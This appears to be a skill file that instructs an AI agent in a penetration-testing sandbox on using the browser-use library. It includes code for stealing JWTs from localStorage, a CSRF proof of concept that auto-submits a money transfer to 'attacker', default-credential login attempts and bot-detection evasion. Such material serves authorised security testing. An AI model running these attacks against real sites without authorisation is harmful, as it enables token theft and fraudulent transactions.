---
name: browser_use
description: browser-use Python library for advanced browser automation with AI agents. Direct API for complex multi-step workflows, authentication, and stealth browsing. Pre-installed in the sandbox; use via exec_command with Python scripts.
---

# browser-use Python library

Advanced browser automation with native AI agent integration. Use for complex multi-step workflows that need intelligent decision-making.

## When to Use

- **Complex auth flows** - OAuth, MFA, SSO with redirects
- **Multi-step forms** - Registration, checkout, multi-page wizards
- **SPA testing** - React/Vue/Angular apps with dynamic content
- **Stealth testing** - Avoid bot detection, CAPTCHAs
- **Intelligent navigation** - Agent decides next steps based on page state

## When NOT to Use

- Simple page interactions (use agent-browser CLI instead)
- Single-page snapshots (agent-browser is faster)
- When you just need to click/fill one element

## Quick Start

```python
import asyncio
from browser_use import Agent, Browser, Controller

async def test_login():
    controller = Controller()
    
    @controller.action("Login to the application")
    async def login():
        browser = Browser()
        page = await browser.get_current_page()
        await page.fill('input[name="email"]', 'admin@test.com')
        await page.fill('input[name="password"]', 'password123')
        await page.click('button[type="submit"]')
        await page.wait_for_load_state('networkidle')
        return "Login attempted"
    
    agent = Agent(
        task="Test login with default credentials",
        controller=controller,
    )
    await agent.run()

asyncio.run(test_login())
```

## Core Concepts

### Agent

The main entry point. Takes a task description and executes it autonomously:

```python
from browser_use import Agent

agent = Agent(
    task="Find and exploit SQL injection in login form",
    llm=your_llm,  # Optional: for intelligent decision-making
)
history = await agent.run()
```

### Controller

Define custom actions the agent can take:

```python
from browser_use import Controller

controller = Controller()

@controller.action("Extract page content")
async def extract_content():
    browser = Browser()
    page = await browser.get_current_page()
    content = await page.content()
    return content

@controller.action("Take screenshot")
async def screenshot(name: str = "evidence"):
    browser = Browser()
    page = await browser.get_current_page()
    await page.screenshot(path=f"/workspace/{name}.png")
    return f"Screenshot saved: {name}.png"
```

### Browser

Direct access to Playwright's browser instance:

```python
from browser_use import Browser

browser = Browser()
page = await browser.get_current_page()

# Direct Playwright actions
await page.goto("https://target.com")
await page.fill("#username", "admin")
await page.click("#login-btn")
await page.wait_for_load_state("networkidle")
```

## Security Testing Examples

### JWT Token Theft via XSS

```python
import asyncio
from browser_use import Agent, Controller

async def test_xss_jwt_theft():
    controller = Controller()
    
    @controller.action("Steal JWT from localStorage")
    async def steal_jwt():
        browser = Browser()
        page = await browser.get_current_page()
        token = await page.evaluate("localStorage.getItem('admin_token')")
        if token:
            print(f"[!] JWT Token: {token}")
            return f"Token stolen: {token[:50]}..."
        return "No token found"
    
    agent = Agent(
        task="Navigate to login page, inject XSS payload to steal JWT",
        controller=controller,
    )
    await agent.run()

asyncio.run(test_xss_jwt_theft())
```

### Multi-Step Authentication Bypass

```python
import asyncio
from browser_use import Agent, Controller

async def test_auth_bypass():
    controller = Controller()
    
    @controller.action("Test session fixation")
    async def test_fixation():
        browser = Browser()
        page = await browser.get_current_page()
        
        # Get session cookie before login
        cookies = await page.context.cookies()
        pre_login = [c for c in cookies if c['name'] == 'session_id']
        
        # Perform login
        await page.fill('#email', 'user@test.com')
        await page.fill('#password', 'password')
        await page.click('#login')
        await page.wait_for_load_state('networkidle')
        
        # Check if session ID changed
        cookies = await page.context.cookies()
        post_login = [c for c in cookies if c['name'] == 'session_id']
        
        if pre_login and post_login and pre_login[0]['value'] == post_login[0]['value']:
            return "VULNERABLE: Session ID not regenerated after login"
        return "Session ID properly regenerated"
    
    agent = Agent(
        task="Test for session fixation vulnerability",
        controller=controller,
    )
    await agent.run()

asyncio.run(test_auth_bypass())
```

### Automated CSRF Testing

```python
import asyncio
from browser_use import Agent, Controller

async def test_csrf():
    controller = Controller()
    
    @controller.action("Generate CSRF PoC")
    async def generate_csrf_poc():
        browser = Browser()
        page = await browser.get_current_page()
        
        # Extract CSRF token
        token = await page.evaluate("""
            document.querySelector('input[name="csrf_token"]')?.value
        """)
        
        # Create malicious form
        html = f"""
        <html>
        <body>
            <form action="https://target.com/api/transfer" method="POST">
                <input type="hidden" name="csrf_token" value="{token}">
                <input type="hidden" name="amount" value="10000">
                <input type="hidden" name="to" value="attacker">
            </form>
            <script>document.forms[0].submit();</script>
        </body>
        </html>
        """
        
        return f"CSRF PoC generated with token: {token[:20]}..."
    
    agent = Agent(
        task="Extract CSRF token and generate exploitation PoC",
        controller=controller,
    )
    await agent.run()

asyncio.run(test_csrf())
```

## Integration with Aegis

browser-use runs inside the sandbox container. Use it via `exec_command`:

```bash
# Create a Python script
cat > /workspace/test_browser.py << 'EOF'
import asyncio
from browser_use import Agent, Browser

async def main():
    browser = Browser()
    page = await browser.get_current_page()
    await page.goto("https://target.com")
    # ... your testing logic
    
asyncio.run(main())
EOF

# Execute it
python3 /workspace/test_browser.py
```

## Comparison with agent-browser

| Feature | agent-browser | browser-use |
|---------|---------------|-------------|
| **Speed** | Faster (CLI) | Slower (Python overhead) |
| **Intelligence** | Basic actions | LLM-powered decisions |
| **Complexity** | Simple workflows | Multi-step reasoning |
| **Setup** | Pre-installed | Pre-installed |
| **Use case** | Quick testing | Complex exploitation |

**Rule of thumb:** Use agent-browser for quick checks, browser-use for complex multi-step attacks.

## Environment Variables

```bash
# browser-use configuration
BROWSER_USE_HEADLESS=true          # Run headless (default in sandbox)
BROWSER_USE_PROXY=http://127.0.0.1:48080  # Caido proxy
```

## Tips

1. **Always use async/await** - browser-use is async-first
2. **Return strings from actions** - agent uses return values for decisions
3. **Screenshot evidence** - save screenshots for PoC documentation
4. **Handle timeouts** - web apps can be slow, add appropriate waits
5. **Combine with Caido** - browser-use traffic routes through the proxy automatically
